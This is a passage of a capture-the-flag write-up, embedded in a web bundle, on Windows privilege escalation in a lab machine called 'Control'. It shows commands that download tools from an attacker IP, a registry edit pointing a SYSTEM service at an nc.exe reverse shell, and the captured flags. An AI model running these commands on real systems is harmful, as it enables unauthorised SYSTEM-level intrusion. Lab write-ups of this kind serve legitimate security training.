[System.Net.Dns]::GetHostName()\nFidelity\n")),(0,a.kt)("p",null,"So here I learned that the hostname (DNS) != hostname (computer name).\nMost of the time this will be the same, but here it was not."),(0,a.kt)("p",null,"For professional and attentive guesser, ",(0,a.kt)("inlineCode",{parentName:"p"},"Fidelity")," was written on the home\npage of the webapp."),(0,a.kt)("p",null,"Now that our powershell ",(0,a.kt)("inlineCode",{parentName:"p"},"runas")," works we can grab the user flag."),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"$ nc -nlp 10000\nWindows PowerShell \nCopyright (C) Microsoft Corporation. All rights reserved.\n\nPS C:\\Users\\Hector\\Documents> whoami\ncontrol\\hector\n\nPS C:\\Users\\Hector> gc Desktop\\user.txt\nd8782dd01fb15b72c4b5ba77ef2d472b\n")),(0,a.kt)("h3",{id:"privilege-escalation--hector-to-system"},"Privilege Escalation : hector to system"),(0,a.kt)("p",null,(0,a.kt)("strong",{parentName:"p"},"TL;DR"),": bin path SYSTEM service exploit"),(0,a.kt)("p",null,"We can see if hector has a command history."),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"PS C:\\Users\\Hector> Get-Content C:\\Users\\Hector\\AppData\\Roaming\\Microsoft\\Windows\\Powershell\\PSReadline\\ConsoleHost_history.txt\nget-childitem HKLM:\\SYSTEM\\CurrentControlset | format-list\nget-acl HKLM:\\SYSTEM\\CurrentControlSet | format-list\n")),(0,a.kt)("p",null,"Fine, it seems to be a clue, we must have to look at services."),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},'PS C:\\Users\\Hector> get-acl HKLM:\\System\\CurrentControlSet\\services\\* | Format-List * | findstr /i "Hector Users Path Everyone"\n')),(0,a.kt)("p",null,"There are dozens services where hector has full control, let's find one that ",(0,a.kt)("inlineCode",{parentName:"p"},"iusr")," can restart."),(0,a.kt)("p",null,"Let's try with a sysinternal tool."),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"$ cp /usr/share/windows/sysinternals-suite/accesschk64.exe .\n")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},'PS C:\\Users\\Hector\\Videos> powershell -nop -c "wget http://10.10.15.123:8080/accesschk64.exe -OutFile cyfun.exe"\n\n.\\cyfun.exe -uwcqv Hector * /accepteula\n')),(0,a.kt)("p",null,"But access denied because it tries to open Service Control Manager."),(0,a.kt)("p",null,"Get all services:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"PS C:\\Users\\Hector\\Videos> reg query hklm\\system\\currentcontrolset\\services > cyfun.txt\nPS C:\\Users\\Hector\\Videos> copy cyfun.txt C:\\inetpub\\wwwroot\\uploads\\cyfun.txt\n$ cat services_fullpath.txt| cut -d '\\' -f 5 > services.txt\n")),(0,a.kt)("p",null,"Get services owners and who can modify them."),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"PS C:\\Users\\Hector\\Videos> get-acl HKLM:\\System\\CurrentControlSet\\services\\* | Format-List PSChildName,Owner,Group,AccessToString | Out-String -Width 300 > cyfun.txt\nPS C:\\Users\\Hector\\Videos> copy cyfun.txt C:\\inetpub\\wwwroot\\uploads\\cyfun.txt\n")),(0,a.kt)("p",null,"Get services registry binary path"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},'PS C:\\Users\\Hector\\Videos> reg query hklm\\System\\CurrentControlSet\\Services /s /v imagepath\n\npowershell -nop -c "wget http://10.10.15.123:8080/services_name.txt -OutFile services_name.txt"\n')),(0,a.kt)("p",null,"In ",(0,a.kt)("inlineCode",{parentName:"p"},"cmd.exe")," we can try to loop over all services like that:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"FOR /F %i in (services_name.txt) DO @sc qc %i\n")),(0,a.kt)("p",null,"I translated this in PowerShell to check process that the user has access to:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-powershell"},"foreach($line in Get-Content .\\services_name.txt) { \n  $res = iex \"sc.exe qc $line\"\n  if($res -match 'QueryServiceConfig SUCCESS'){\n    echo $res\n  }\n}\n")),(0,a.kt)("p",null,"So we have a list of services that Hector can modify, that iusr can restart and\nthat are own and executed as SYSTEM."),(0,a.kt)("p",null,"With Hector we try to modify ",(0,a.kt)("inlineCode",{parentName:"p"},"wuauserv")," binary to a reverse shell command:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},'C:\\Users\\Hector\\Videos>reg add HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\wuauserv /v ImagePath /t REG_EXPAND_SZ /d "C:\\Inetpub\\wwwroot\\uploads\\nc.exe 10.10.15.123 10004 -e powershell.exe" /f\nThe operation completed successfully.\n')),(0,a.kt)("p",null,"With iusr we start the service: ",(0,a.kt)("inlineCode",{parentName:"p"},"sc start wuauserv")," so we gain a system shell."),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"nc -nlp 10004\nWindows PowerShell \nCopyright (C) Microsoft Corporation. All rights reserved.\n\nPS C:\\Windows\\system32> gc C:\\Users\\Administrator\\Desktop\\root.txt\n8f8613f5b4da391f36ef11def4cec1b1\n\nPS C:\\Windows\\system32> whoami\nnt authority\\system\n")),(0,a.kt)("p",null,"Note: the command is executed even if ",(0,a.kt)("inlineCode",{parentName:"p"},"sc")," displays an error."),(0,a.kt)("p",null,"Why ",(0,a.kt)("inlineCode",{parentName:"p"},"wuauserv"),"? I just tried them all and it worked with this one."),(0,a.kt)("h3",{id:"files"},"Files"),(0,a.kt)("p",null,"As the output of the commands listing services were very long I pasted them\nin a Gist."),(0,a.kt)("p",null,(0,a.kt)("a",{parentName:"p",href:"https://gist.github.com/S4CH/6b3f8d923b661c050e696f2d6e871b94"},"Gist")),(0,a.kt)("ul",null,(0,a.kt)("li",{parentName:"ul"},(0,a.kt)("a",{parentName:"li",href:"https://gist.github.com/S4CH/6b3f8d923b661c050e696f2d6e871b94#file-services_bin_path_for_htb-txt"},"services_bin_path.txt")),(0,a.kt)("li",{parentName:"ul"},(0,a.kt)("a",{parentName:"li",href:"https://gist.github.com/S4CH/56934c1c8943c988f8758d9ac03591d9#file-services_full_path_for_htb-txt"},"services_fullpath.txt")),(0,a.kt)("li",{parentName:"ul"},(0,a.kt)("a",{parentName:"li",href:"https://gist.github.com/S4CH/3653068fa256096b7ce2b5c223385ceb#file-names_of_services-txt"},"services_name.txt")),(0,a.kt)("li",{parentName:"ul"},(0,a.kt)("a",{parentName:"li",href:"https://gist.github.com/S4CH/349fd9b09271f01c3bbd2b532695b289#file-names_of_services-_2-txt"},"services_name2.txt")),(0,a.kt)("li",{parentName:"ul"},(0,a.kt)("a",{parentName:"li",href:"https://gist.github.com/S4CH/13da1ea8075115d4859e9130c02e461b#file-services_rights_for_htb-txt"},"services_rights.txt")),(0,a.kt)("li",{parentName:"ul"},(0,a.kt)("a",{parentName:"li",href:"https://gist.github.com/S4CH/7f4983f57de320b529a58abc640e71e7#file-restarted_services-txt"},"services_that_can_be_restarted.txt"))))}m.isMDXComponent=!0},92064:(e,t,n)=>{n.d(t,{Z:()=>r});const r=n.p+"assets/images/control-2f665bdfbc728baf4db00ec162efba7e.png"}}]);